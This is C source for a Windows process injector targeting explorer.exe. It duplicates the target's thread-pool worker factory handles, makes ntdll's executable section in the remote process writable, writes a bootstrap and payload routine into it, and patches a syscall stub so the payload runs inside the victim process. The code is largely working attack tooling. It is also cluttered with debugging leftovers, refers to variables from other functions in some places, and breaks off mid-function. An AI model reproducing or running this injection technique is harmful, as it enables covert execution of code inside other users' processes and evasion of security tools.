//After 
//- 0F 34
//- 0F 05
//- CD 2E
//
//must follow
//- C2 XX XX
//- C3

//#include <winternl.h>
///*****This module contains code for the injector implementation.*****

#include "global.h"
#include "payload.h"
#include "auxfuncs.h"

#define TARGET_PROCESS_NAME L"explorer.exe"
#define NT_SYSCALL_START 0x0	///System call numbers always started with 0.
#define NT_SYSCALL_END 0x1000	///0x1000 is the begin of win32k system calls and hence, the last possible NT syscall is 0xFFF.
#define REL_JUMP_SIZE 5
#define RT_SECTION_SIZE PAGE_SIZE
#define RT_SECTION_RESERVED_BYTES 1024
#define NTDLL_TEXT_OFFSET PAGE_SIZE
#define NTDLL_TEXT_SIZE_WIN10 (1024 * 1012)
#define WORKER_FACTORY_ALL_ACCESS 0xF00FF
#define MAX_HOOK_LEN 0x100

BYTE g_pHookBuffer[MAX_HOOK_LEN];
HANDLE hEvent;
volatile static ULONG_PTR sg_returnAddress;
//static BYTE sg_

typedef struct _WORKER_FACTORY_BASIC_INFORMATION
{
	LARGE_INTEGER Timeout;
	LARGE_INTEGER RetryTimeout;
	LARGE_INTEGER IdleTimeout;
	BOOLEAN Paused;
	BOOLEAN TimerSet;
	BOOLEAN QueuedToExWorker;
	BOOLEAN MayCreate;
	BOOLEAN CreateInProgress;
	BOOLEAN InsertedIntoQueue;
	BOOLEAN Shutdown;
	ULONG BindingCount;
	ULONG ThreadMinimum;
	ULONG ThreadMaximum;
	ULONG PendingWorkerCount;
	ULONG WaitingWorkerCount;
	ULONG TotalWorkerCount;
	ULONG ReleaseCount;
	LONGLONG InfiniteWaitGoal;
	PVOID StartRoutine;
	PVOID StartParameter;
	HANDLE ProcessId;
	SIZE_T StackReserve;
	SIZE_T StackCommit;
	NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, *PWORKER_FACTORY_BASIC_INFORMATION;

typedef struct _THREAD_LAST_SYSCALL_INFORMATION{
	PVOID FirstArgument;
	USHORT SystemCallNumber;
} THREAD_LAST_SYSCALL_INFORMATION, *PTHREAD_LAST_SYSCALL_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;



//typedef NTSTATUS (*PLDR_GET_PROCEDURE_ADDRESS)(_In_ PVOID BaseAddress, _In_ PANSI_STRING Name, _In_ ULONG Ordinal, _Out_ PVOID *ProcedureAddress);

//void payloadRoutineBegin(void);
//ULONG_PTR payloadRoutineEnd(void);

///We define a generic system call structure which held true ever since Windows NT 3.51.
typedef struct _NT_SYSCALL_STUB {
	BYTE movR64R64[3];
	BYTE movR32Imm32;
	ULONG syscallNumber;
//	USHORT intelSyscallInstruction;
//	BYTE ret;
//	BYTE nopPadding[5];
} NT_SYSCALL_STUB, *PNT_SYSCALL_STUB;

void dispError(NTSTATUS status) {
	ULONGLONG dummy;
	dummy = 0;
	NtRaiseHardError(status, 1, 0, (PULONG_PTR)&dummy, 0, (PULONG)&dummy);
}

//int customFilter(PVOID exceptionAddress) {
//	sg_returnAddress = (ULONG_PTR)exceptionAddress;
//	//sg_returnAddress = (ULONG_PTR)((PEXCEPTION_POINTERS)_exception_info())->ExceptionRecord->ExceptionAddress;
//	NtTerminateThread(NtCurrentThread(), STATUS_SUCCESS);
//	return 0;
//}

DWORD auxThread(PVOID pThrdParam){
	FILE_IO_COMPLETION_INFORMATION miniPacket = { 0 };
	ULONG_PTR param4 = 0x0;
	ULONG_PTR param5 = 0x0;
	//CONTEXT errorContext;
	NTSTATUS status = STATUS_SUCCESS;
	//EXCEPTION_RECORD64 blah;
	//blah.ExceptionAddress;
	//LONG prevstate;
	//PEXCEPTION_POINTERS ptrs = NULL;
	//SYSTEM_PROCESS_INFORMATION info;
	//info.
	__try {
	//NtSetEvent(hEvent, &prevstate);
	//markee:
	//	miniPacket.ApcContext = NULL;
	//	miniPacket.KeyContext = NULL;
	//	miniPacket.IoStatusBlock.Information = 0;
	//	miniPacket.IoStatusBlock.Status = 0x0;
	//	param4 = 0x0;
	//	param5 = 0x0;
		status = NtWaitForWorkViaWorkerFactory((HANDLE)pThrdParam, &miniPacket, 0x10, &param4, &param5);
		//if (status)
		//	dispError(status);
		//goto markee;
	}
	//__except (EXCEPTION_EXECUTE_HANDLER) {
	//	//GetExceptionInformation();
	//	ptrs = (PEXCEPTION_POINTERS)_exception_info();
	//	*(PULONG_PTR)&g_pHookBuffer[0] = ptrs->ExceptionRecord->ExceptionAddress;
	//	//RtlCaptureContext(&errorContext);
	//	//*(PULONG_PTR)&g_pHookBuffer[0] = errorContext.LastBranchFromRip;
	//	//*(PULONG_PTR)&g_pHookBuffer[8] = errorContext.LastBranchToRip;
	//	//*(PULONG_PTR)&g_pHookBuffer[0x10] = errorContext.LastExceptionFromRip;
	//	//*(PULONG_PTR)&g_pHookBuffer[0x18] = errorContext.LastExceptionToRip;
	//	//*(PULONG_PTR)&g_pHookBuffer[0x20] = errorContext.Rip;
	//	
	//	dispError(STATUS_ACCESS_VIOLATION);
	//}
	//__except (customFilter(((PEXCEPTION_POINTERS)_exception_info())->ExceptionRecord->ExceptionAddress)) {
	//__except (*(PULONG_PTR)&g_pHookBuffer[0] = (ULONG_PTR)((PEXCEPTION_POINTERS)_exception_info())->ExceptionRecord->ExceptionAddress) {
	__except (sg_returnAddress = (ULONG_PTR)((PEXCEPTION_POINTERS)_exception_info())->ExceptionRecord->ExceptionAddress) {
		__nop();
		//dispError(STATUS_ACCESS_VIOLATION);
	}
	
	return (DWORD)status;
}

NTSTATUS openWorkerFactory(PHANDLE pWorkerFactory, HANDLE hProcess, HANDLE targetPid, PHANDLE pLocalWorkerFactory) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	HANDLE hLocalWorkerFactory = NULL;
	HANDLE hRemoteWorkerFactory = NULL;
	HANDLE hIoCompletion = NULL;
	HANDLE hDummyThread = NULL;
	static USHORT objIndex = 0;
	ULONG handleInfoSize = 0;
	SIZE_T handleInfoMemSize = 0;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleList = NULL;
	SYSTEM_HANDLE_INFORMATION_EX handleInfo;
	WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo= { 0 };
	ULONG returnlen;
	//BYTE pGarbageBuf[0x20] = { 0xEB, 0xFE };
	BYTE pGarbageBuf[0x20] = { 0 };
	//HANDLE hEvent = NULL;
	//FILE_IO_COMPLETION_INFORMATION completionInfo;
	//ULONG threadGoal = 0x4;
	//SIZE_T byteswritten;
	PVOID pBase = (PVOID)&NtWaitForWorkViaWorkerFactory;
	SIZE_T protSize = 0x1000;
	ULONG oldprot;
	//BYTE lastSyscallInfo[0x100];
	//ULONG infoLength = 0;
	//NtQueryIn
	//completionInfo.ApcContext = NULL;
	//completionInfo.IoStatusBlock.Information = 0x0;
	//completionInfo.IoStatusBlock.Pointer = NULL;
	//completionInfo.KeyContext = NULL;
	//ULONG_PTR param4 = 0x0;
	//*((USHORT*)pGarbageBuf) = 0xFEEB;
	
	//ULONG_PTR param5 = 0x0;
	OBJECT_ATTRIBUTES thrdAttr = { 0x30 };
	do {
		if (pWorkerFactory)
			*pWorkerFactory = NULL;

		if (pLocalWorkerFactory)
			*pLocalWorkerFactory = NULL;

		//LPTHREAD_START_ROUTINE
		if (!pWorkerFactory || !hProcess || INVALID_HANDLE_VALUE == hProcess || !targetPid || !pLocalWorkerFactory) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!objIndex) {
			///We need this for the next call, and the parameters are quite uncritical.
			status = NtCreateIoCompletion(&hIoCompletion, IO_COMPLETION_ALL_ACCESS, NULL, 2);
			if (status) {
				hIoCompletion = NULL;
				break;
			}
			
			///We create an archetypal TpWorkerFactory object in order to later deduce the object type from it...  
			status = NtCreateWorkerFactory(&hLocalWorkerFactory, WORKER_FACTORY_ALL_ACCESS, NULL, hIoCompletion, NtCurrentProcess(), NtCurrentPeb(), NtCurrentTeb(), 0x2, 0, 0);
			if (status) {
				hLocalWorkerFactory = NULL;
				break;
			}
			*pLocalWorkerFactory = hLocalWorkerFactory;
		}

		status = NtQuerySystemInformation(SystemExtendedHandleInformation, &handleInfo, sizeof(SYSTEM_HANDLE_INFORMATION_EX), &handleInfoSize);
		if ((STATUS_BUFFER_TOO_SMALL != status) && (STATUS_BUFFER_OVERFLOW != status) && (STATUS_INFO_LENGTH_MISMATCH != status))
			break;

		handleInfoMemSize = sizeof(SYSTEM_HANDLE_INFORMATION_EX) + handleInfo.NumberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX);
		handleInfoMemSize += (handleInfoMemSize / 2);	///We should allocate much additional memory since the
														///total system handle count may extremely fluctuate.
														///If between the two information requests the handle count happens
														///to largely rise we will have allocated memory to only hold handle info structs
														///as much as the count was before the rise. Thus the safety margin.
		status = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &pHandleList, 0, &handleInfoMemSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (status) {
			pHandleList = NULL;
			break;
		}

		handleInfoSize = (ULONG)handleInfoMemSize;
		///Now retrieve the entire list of all handles currently opened on this system.
		///The list contains not only the process which has opened the handle but also
		///the handle value. Additionally it contains the type number of each object the handles are opened to.
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleList, handleInfoSize, &handleInfoSize);
		if (status)
			break;
		
		if (!objIndex) {
			///Since we exactly know our pid as well as our WorkerFactory handle value
			///we can exploit our local WorkerFactory in order to figure out the TpWorkerFactory object type.
			///Kind of workaround for NtQueryObject(ObjectTypeInformation) since this call doesn't provide useful info.
			for (ULONG i = 0; i < pHandleList->NumberOfHandles; i++) {
				if (NtCurrentTeb()->ClientId.UniqueProcess == pHandleList->Handles[i].UniqueProcessId) {
					if (hLocalWorkerFactory == pHandleList->Handles[i].HandleValue) {
						objIndex = pHandleList->Handles[i].ObjectTypeIndex;
						break;
					}
				}
			}

			if (0 == objIndex) {	///Assumption 0 is invalid object type
				status = STATUS_OBJECTID_NOT_FOUND;
				break;
			}
		}

		///Now check for any handles incorporating the determined TpWorkerFactory object id and at the
		///same time existing in our target process 
		for (ULONG i = 0; i < pHandleList->NumberOfHandles; i++) {
			if (targetPid == pHandleList->Handles[i].UniqueProcessId) {
				if (objIndex == pHandleList->Handles[i].ObjectTypeIndex) {
					///Finally clone the TpWorkerFactory handle into ourselves so we can perform remote control on the corresponding thread pool later on.
					status = NtDuplicateObject(hProcess, pHandleList->Handles[i].HandleValue, INVALID_HANDLE_VALUE, &hRemoteWorkerFactory, WORKER_FACTORY_ALL_ACCESS, OBJ_CASE_INSENSITIVE, 0);
					if (!status)
						break;
				}
			}
		}
		if (!hRemoteWorkerFactory) {
			status = STATUS_OBJECT_NOT_EXTERNALLY_BACKED;
			break;
		}

		*pWorkerFactory = hRemoteWorkerFactory;
	} while (status);

	//if (hLocalWorkerFactory)
	//	NtClose(hLocalWorkerFactory);

	if (hIoCompletion)
		NtClose(hIoCompletion);

	if (pHandleList)
		NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pHandleList, &handleInfoMemSize, MEM_RELEASE);

	return status;
}

///Pretty self explaining... one provides a valid RVA and a base address corresponding to an on-disk image
///and gets a pointer to the file offset which at the same time is a valid pointer into the on-disk like
///memory buffer.
PVOID rvaToFileOffset(_In_ ULONG rva, _In_ PVOID pMemoryBase) {
	PIMAGE_NT_HEADERS pNtdllPeHdr = (PIMAGE_NT_HEADERS)((PUCHAR)pMemoryBase + ((PIMAGE_DOS_HEADER)pMemoryBase)->e_lfanew);
	PIMAGE_SECTION_HEADER pFirstSecHdr = IMAGE_FIRST_SECTION(pNtdllPeHdr);
	for (ULONG i = 0; i < pNtdllPeHdr->FileHeader.NumberOfSections; i++) {
		if ((pFirstSecHdr[i].VirtualAddress <= rva) && (rva < pFirstSecHdr[i].VirtualAddress + pFirstSecHdr[i].Misc.VirtualSize))
			return  (PUCHAR)pMemoryBase + rva + pFirstSecHdr[i].PointerToRawData - pFirstSecHdr[i].VirtualAddress;
	}
	return NULL;
}

#define MIN_VM_ACCESS_MASK (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION)
NTSTATUS prepareHookBuffer(PBYTE pHookBuffer, SIZE_T* pBufSize, ULONG_PTR targetNtFunction, ULONG_PTR payloadAddress) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	ULONG magic = 0xB8D18B4C;
	ULONG stubLength = 4;
	PBYTE pTargetNtFunction = (PBYTE)targetNtFunction;
	//CONTEXT ctx;
	dispError(0xC0000458);


	do {
		if (!pHookBuffer || !pBufSize || !targetNtFunction || !payloadAddress) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!*pBufSize) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (42 < ((PNT_SYSCALL_STUB)targetNtFunction)->syscallNumber) {
			while (magic != *(PULONG)(targetNtFunction - stubLength)) {
				stubLength++;
				if (*pBufSize < stubLength) {
					status = STATUS_INFO_LENGTH_MISMATCH;
					break;
				}
			}
			dispError((NTSTATUS)stubLength + 0xC0000000);
		}
		else {
			while (magic != *(PULONG)(targetNtFunction + stubLength)) {
				stubLength++;
				if (*pBufSize < stubLength) {
					status = STATUS_INFO_LENGTH_MISMATCH;
					break;
				}
			}
			dispError((NTSTATUS)stubLength + 0xC0000000);
		}

		*pBufSize = stubLength;
		for (ULONG i = 0; i < stubLength; i++)
			pHookBuffer[i] = pTargetNtFunction[i];


		//NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE);
		//status = NtCreateThread(&hIoCompletion, THREAD_ALL_ACCESS, &thrdAttr)
		status = NtCreateThreadEx(&hDummyThread, THREAD_ALL_ACCESS, &thrdAttr, NtCurrentProcess(), &auxThread, hLocalWorkerFactory, 0x0, 0x0, 0x0, 0x0, NULL);
		if (status) {
			hDummyThread = NULL;
			break;
		}//dispError(status);

		while (!status && !workerFactoryInfo.WaitingWorkerCount) {
			workerFactoryInfo.WaitingWorkerCount = 0;
			status = NtQueryInformationWorkerFactory(hLocalWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), &returnlen);
		}
		//workerFactoryInfo
		if (status)
			break;

		//dispError(0x80000001);
		//dispError(0x40000001);
		//while (!status && (hLocalWorkerFactory != ((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument))
		//status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, returnlen, &returnlen);

		//if (status)
		//	break;
		////infoLength = 1;
		//NtSuspendThread(hDummyThread, &returnlen);
		//status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, 0x18, &returnlen);
		//NtResumeThread(hDummyThread, &returnlen);
		//dispError(status);
		//for (ULONG i = 1; i < sizeof(lastSyscallInfo); i++) {
		//	//dispError(status);
		//	status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, i, &returnlen);
		//	if (!status) {
		//		dispError(0x80000000 + (NTSTATUS)i);
		//		infoLength = i;
		//		break;
		//	}
		//}
		//while(STATUS_INFO_LENGTH_MISMATCH)
		//NtSuspendThread(hDummyThread, &returnlen);
		//status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, 0x18, &returnlen);
		//NtResumeThread(hDummyThread, &returnlen);
		//	infoLength = 1;
		//	for (ULONG i = 1; i < sizeof(lastSyscallInfo); i++) {
		//		//if (!infoLength)
		//			//infoLength = i;
		//		//infoLength = returnlen ? returnlen : i;
		//		//dispError(0xC0000000 + (NTSTATUS)infoLength);
		//		((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument = NULL;
		//		status = NtSuspendThread(hDummyThread, &returnlen);
		//		dispError(status);
		//		status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, infoLength, &returnlen);
		//		NtResumeThread(hDummyThread, &returnlen);
		//		if (!status) {
		//			dispError(0x80000000 + (NTSTATUS)i);
		//			//returnlen = i;	///We found a working information length, save it
		//			if(hLocalWorkerFactory == ((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument)
		//				break;

		//			i = 0;
		//		}
		//		else {
		//			infoLength = i;
		//			//returnlen = 0;
		//		}
		//	}

		//	if (status)
		//		break;
		//	
		//	//while (!status && (hLocalWorkerFactory != ((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument))
		//	//	status = NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, returnlen, &returnlen);

		//	//if (status)
		//	//	break;

		//	dispError(0xC0000000+(NTSTATUS)(ULONG_PTR)((PTHREAD_LAST_SYSCALL_INFORMATION)lastSyscallInfo)->FirstArgument);

		//	//0:000> dt _THREAD_LAST_SYSCALL_INFORMATION
		//	//	twinui!_THREAD_LAST_SYSCALL_INFORMATION
		//	//	+ 0x000 FirstArgument    : Ptr64 Void
		//	//	+ 0x008 SystemCallNumber : Uint2B
		//	//	+ 0x00a Pad : [3] Uint2B
		//	//	+ 0x010 WaitTime : Uint8B
		//	//for (ULONG i = 4; i < sizeof(lastSyscallInfo); i += 4) {
		//	//	
		//	//}
		////	NtQueryInformationThread(hDummyThread, ThreadLastSystemCall, lastSyscallInfo, )
		//	//THREAD_BASIC_INFORMATION blah;
		//	
		//	//while (status == !workerFactoryInfo.WaitingWorkerCount) {
		//	//	status = NtQueryInformationWorkerFactory(hLocalWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), &returnlen);
		//	//if(status)
		//	//}
		//	//dispError((NTSTATUS)workerFactoryInfo.WaitingWorkerCount);
		//	//status = NtQueryInformationWorkerFactory(hLocalWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), &returnlen);
		//	//if (status) {
		//	//	hDummyThread = NULL;
		//	//	break;
		//	//}
		//	//dispError((NTSTATUS)workerFactoryInfo.WaitingWorkerCount);

		//	//NtWaitForSingleObject(hEvent, FALSE, NULL);
		status = NtProtectVirtualMemory(NtCurrentProcess(), &pBase, &protSize, PAGE_EXECUTE_READWRITE, &oldprot);
		if (status) {
			hIoCompletion = NULL;
			break;
		}
		//status = NtWriteVirtualMemory(NtCurrentProcess(), (PVOID)&NtWaitForWorkViaWorkerFactory, pGarbageBuf, 0x20, &byteswritten);
		//if (status) {
		//	hIoCompletion = NULL;
		//	break;
		//}
		RtlCopyMemory((PVOID)&NtWaitForWorkViaWorkerFactory, pGarbageBuf, 0x20);
		//status = NtSetIoCompletion(hIoCompletion, &hIoCompletion, &hLocalWorkerFactory, 0x0, 0x20);
		////status = NtSetIoCompletionEx(hIoCompletion, NULL, &hLocalWorkerFactory, pWorkerFactory, STATUS_SUCCESS, 0x20);
		//dispError(status+1);
		status = NtReleaseWorkerFactoryWorker(hLocalWorkerFactory);
		NtTerminateThread(hIoCompletion, 0x0);
		//NtWaitForSingleObject(hIoCompletion, FALSE, NULL);
		//*(PULONG_PTR)g_pHookBuffer = sg_returnAddress;
		//dispError(STATUS_DRIVERS_LEAKING_LOCKED_PAGES);
		//NtTerminateThread(hIoCompletion, 0x0);
		//if (*((PULONG_PTR)g_pHookBuffer)) {
		//	dispError(0xC0000100);
		//}
		dispError(STATUS_DRIVERS_LEAKING_LOCKED_PAGES + 1);
		//status = NtSetInformationWorkerFactory(hLocalWorkerFactory, WorkerFactoryAdjustThreadGoal, &threadGoal, sizeof(ULONG));
		//dispError(status);
		//status = NtWorkerFactoryWorkerReady(hLocalWorkerFactory);
		//dispError(status);
		//for (ULONG_PTR i = 4; i < 0x1000; i += 4) {
		//completionInfo.ApcContext = NULL;
		//completionInfo.IoStatusBlock.Information = 0x0;
		//completionInfo.IoStatusBlock.Pointer = NULL;
		//completionInfo.KeyContext = NULL;
		//////completionInfo.blah = NULL;
		////completionInfo.ApcContext = (PVOID)&completionInfo.ApcContext;
		////completionInfo.IoStatusBlock.Information = 0x20;
		////completionInfo.IoStatusBlock.Pointer = (PVOID)&completionInfo.IoStatusBlock.Pointer;
		////completionInfo.KeyContext = (PVOID)&completionInfo.KeyContext;
		////completionInfo.blah = (PVOID)&completionInfo.blah;
		//param4 = 0;
		//param5 = 0;
		//status = NtWaitForWorkViaWorkerFactory(hLocalWorkerFactory, &completionInfo, 0x10, &param4, &param5);
		//status = NtReleaseWorkerFactoryWorker(hLocalWorkerFactory);
		//	dispError(status);
		//}
		//NtGetContextThread()


		for (ULONG i = 4; i < stubLength - 3; i++) {
			if ((0x050F == *(PSHORT)&pHookBuffer[i]) ||
				(0x340F == *(PSHORT)&pHookBuffer[i]) ||
				(0x2ECD == *(PSHORT)&pHookBuffer[i])) {
				//if (0xC3 == pHookBuffer[i + 2] || 0xC2 == pHookBuffer[i + 2]) {
				if (0xC3 == pHookBuffer[i + 2]){	
					pHookBuffer[i + 2] = 0xE8;
					*(PULONG)&pHookBuffer[i + 3] = (ULONG)(payloadAddress - ((targetNtFunction + (i + 2)) + 5));
					status = STATUS_SUCCESS;
					break;
					//i += 5;
				}
			}
		}

		for (ULONG i = 0; i < stubLength; i++)
			g_pHookBuffer[i] = pHookBuffer[i];

		if (status)
			break;

	} while (status);
	return status;
}


NTSTATUS injectIntoProcess(HANDLE hProcess, HANDLE hRemoteWorkerFactory, ULONG_PTR injectionHookAddress){
	//LARGE_INTEGER interval;
	SIZE_T bytesWritten;
	//ULONG callDisplacement;
	ULONG_PTR bootstrapAddress;
	ULONG oldHookProtect = 0x0;
	PVOID pNtdllRxBegin = NULL;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	SIZE_T bytesToProtect = PAGE_SIZE;
	//USHORT lineNum = 0;
	SIZE_T hooklen = MAX_HOOK_LEN;
	BYTE hookBuffer[MAX_HOOK_LEN];
	//BYTE injectionCode[] = { 0xE8, 0xBB, 0xBB, 0xBB, 0xBB };
	//ULONG injectionCode[] = { 0xE890050F, 0xBBBBBBBB };
	ULONG* pSyscallArray = (PULONG)((ULONG_PTR)&bootstrapCodeBegin + 0x28);
	HANDLE hRemoteEvent = NULL;
//	HANDLE hEvent = NULL;
	//ULONG_PTR* pLdrGetProcedureAddress = (PULONG_PTR)((ULONG_PTR)&bootstrapCodeBegin + 0x40);
	//ANSI_STRING aMessageBeep;
	//UNICODE_STRING uKernelbaseDll;
	//PVOID pKernelbase = NULL;
	//RtlInitUnicodeString(&uKernelbaseDll, L"user32.dll");
	//RtlInitAnsiString(&aMessageBeep, "MessageBeep");
	//PMESSAGE_BEEP fpMessageBeep = NULL;
	//interval.QuadPart = timeoutMilliseconds * (long long)(-10000);

	//MessageBeep(MB_ICONEXCLAMATION);
	do {
		status = openWorkerFactory(&hWorkerFactory, hProcess, cid.UniqueProcess);
		if (status)
			continue;

		status = NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE);
		if (status)
			break;

		status = NtDuplicateObject(NtCurrentProcess(), hEvent, hProcess, &hRemoteEvent, EVENT_ALL_ACCESS, DUPLICATE_SAME_ATTRIBUTES, 0x0);
		if (status)
			break;
		dispError((NTSTATUS)(ULONG_PTR)hRemoteEvent + 0xC0000000);

		bytesToProtect = NTDLL_TEXT_SIZE_WIN10;	///<=== VERY bad. ntdll RX size is hardcoded!
		pNtdllRxBegin = (PVOID)(NTDLL_TEXT_OFFSET + (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)((PLDR_DATA_TABLE_ENTRY)NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink)->InLoadOrderLinks.Flink)->DllBase);
		bootstrapAddress = (ULONG_PTR)pNtdllRxBegin + bytesToProtect - RT_SECTION_SIZE + RT_SECTION_RESERVED_BYTES;	///Last 3 KB of RT section
		//callDisplacement = (ULONG)(bootstrapAddress - (injectionHookAddress + 3) - REL_JUMP_SIZE);	///3 is due to injectionHookAddress != jmp instruction address.
		//callDisplacement = (ULONG)(bootstrapAddress+0x80 - (injectionHookAddress + 3) - REL_JUMP_SIZE);
		//injectionCode[1] = callDisplacement;
		status = prepareHookBuffer(hookBuffer, &hooklen, injectionHookAddress, bootstrapAddress+0x80);
		if (status)
			break;
		//g_returnInstruction[0] = 0xC3;
		g_resumationHandle = (ULONG_PTR)hRemoteEvent;
		//g_originalSyscallCode = *(PULONGLONG)injectionHookAddress;
		//status = LdrLoadDll(NULL, NULL, &uKernelbaseDll, &pKernelbase);
		//if (status)
		//	break;
		//GetProcAddress;
		//FARPROC
		//status = LdrGetProcedureAddress(pKernelbase, &aMessageBeep, 0, (FARPROC*)&fpMessageBeep);
		//if(status)
		//	break;
		//fpMessageBeep(MB_ICONERROR);
		status = NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, PAGE_EXECUTE_READWRITE, &oldHookProtect);
		if (status)
			break;

		//*pLdrGetProcedureAddress = (ULONG_PTR)fpMessageBeep;
		//pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtRaiseHardError)->syscallNumber;
		//pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtDelayExecution)->syscallNumber;
		//pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtSuspendThread)->syscallNumber;
		pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtWaitForSingleObject)->syscallNumber;
		pSyscallArray[1] = ((PNT_SYSCALL_STUB)NtSetEvent)->syscallNumber;
		//pSyscallArray[1] = ((PNT_SYSCALL_STUB)NtCreateMutant)->syscallNumber;
		pSyscallArray[2] = ((PNT_SYSCALL_STUB)NtOpenFile)->syscallNumber;
		pSyscallArray[3] = ((PNT_SYSCALL_STUB)NtDeviceIoControlFile)->syscallNumber;
		pSyscallArray[4] = ((PNT_SYSCALL_STUB)NtClose)->syscallNumber;
		pSyscallArray[5] = ((PNT_SYSCALL_STUB)NtCreateSemaphore)->syscallNumber;
		pSyscallArray[6] = ((PNT_SYSCALL_STUB)NtOpenProcess)->syscallNumber;

		//myWPrintf(&lineNum, L"ptr %llx", *pLdrGetProcedureAddress);

		//myWPrintf(&lineNum, L"ptr %p", pLdrGetProcedureAddress);
		//((PMESSAGE_BEEP)fpMessageBeep)(MB_ICONEXCLAMATION);
		status = NtWriteVirtualMemory(hProcess, (PVOID)bootstrapAddress, (PVOID)g_bootstrapCodeBegin, g_bootstrapCodeEnd - g_bootstrapCodeBegin, &bytesWritten);
		if (status)
			break;

		status = NtWriteVirtualMemory(hProcess, (PVOID)(bootstrapAddress+0x80), (PVOID)payloadRoutineBegin, (ULONG_PTR)payloadRoutineEnd - (ULONG_PTR)payloadRoutineBegin, &bytesWritten);
		//status = NtWriteVirtualMemory(hProcess, (PVOID)(bootstrapAddress + 0x100), (PVOID)payloadRoutineBegin, 464, &bytesWritten);
		if (status)
			break;
		
		//NtTerminateThread()
		//NtSuspendProcess(hProcess);
		//status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &injectionCode, sizeof(ULONG_PTR), &bytesWritten);
		status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, hookBuffer, hooklen, &bytesWritten);
		if (status)
			break;

		status = NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
		dispError(status);

		status = NtWaitForSingleObject(hEvent, FALSE, NULL);
		if (STATUS_TIMEOUT == status)
			break;

		NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, (PVOID)injectionHookAddress, hooklen, &bytesWritten);
		NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, oldHookProtect, &oldHookProtect);
		dispError(status);
		//status = NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
	} while (status);
	
	
	
	//if (pKernelbase)
	//	LdrUnloadDll(pKernelbase);
	//NtCreateMutant()
	//myWPrintf(&lineNum, L"aosdhfiu0x%llxwreev", g_bootstrapCodeBegin);

	
	//NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
	//NtSuspendProcess()
	//dispError(status);
	//NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
	//dispError(status);

	//NtDelayExecution(FALSE, &interval);
	//NtResumeProcess(hProcess);
	//NtDelayExecution(FALSE, &interval);
	//NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, oldHookProtect, &oldHookProtect);

	return status;
}



NTSTATUS openProcsByName(PHANDLE pProcess, PUNICODE_STRING pProcName, BOOLEAN useDebugPrivilege) {
	SYSTEM_PROCESS_INFORMATION procInfo;
	OBJECT_BASIC_INFORMATION processHandleInfo;
	CLIENT_ID cid;
	BOOLEAN oldValue;
	HANDLE pid;
	BOOLEAN injectionSucceeded = FALSE;
	NTSTATUS status = STATUS_CACHE_PAGE_LOCKED;
	ULONG procListSize = 0;
	ULONGLONG memSize = 0;
	ULONG obQueryLen = 0;
	PVOID pProcListHead = NULL;
	PSYSTEM_PROCESS_INFORMATION pProcEntry = NULL;
	HANDLE hProcess = NULL;

	if (!pProcName || !pProcess )
		return STATUS_INVALID_PARAMETER;

	*pProcess = NULL;

